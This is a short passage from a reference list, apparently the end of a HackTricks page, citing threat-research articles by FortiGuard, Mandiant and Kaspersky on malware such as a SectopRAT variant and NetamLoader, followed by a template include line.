- [32] [FortiGuard Labs – 正規ソフトウェアに埋め込まれた SectopRAT の亜種を解明](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOW の窃取 (パート 1)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – NetamLoader: XAML ベースの .NET ローディングフレームワーク](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
